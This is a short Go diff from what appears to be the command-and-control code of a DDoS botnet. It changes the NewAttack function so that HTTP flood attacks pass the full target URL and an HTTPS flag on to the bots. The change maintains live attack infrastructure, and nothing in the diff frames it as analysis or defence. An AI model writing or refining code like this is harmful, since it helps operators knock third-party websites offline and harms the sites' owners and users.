@@ -115,10 +115,13 @@ func NewAttack(str string, admin int) (*Attack, error) {
 	}
 	atk.Type = atkInfo.attackID
 
-	isHTTPAttack := atk.Type >= 4 && atk.Type <= 8
+	isHTTPAttack := atk.Type >= 4 && atk.Type <= 7
 
 	if isHTTPAttack {
 		targetURL := args[1]
+
+		/* Store full URL for bot DNS resolution */
+		atk.Flags[14] = targetURL
 
 		if strings.HasPrefix(targetURL, "http://") || strings.HasPrefix(targetURL, "https://") {
 			domain := extractDomainFromURL(targetURL)
@@ -133,10 +136,13 @@ func NewAttack(str string, admin int) (*Attack, error) {
 
 			if strings.HasPrefix(targetURL, "https://") {
 				atk.Flags[15] = "1"
+			} else {
+				atk.Flags[15] = "0"
 			}
 		} else {
 			atk.Flags[8] = args[1]
 			atk.Flags[11] = "/"
+			atk.Flags[15] = "0"
 		}
 
 		atk.Duration = 1
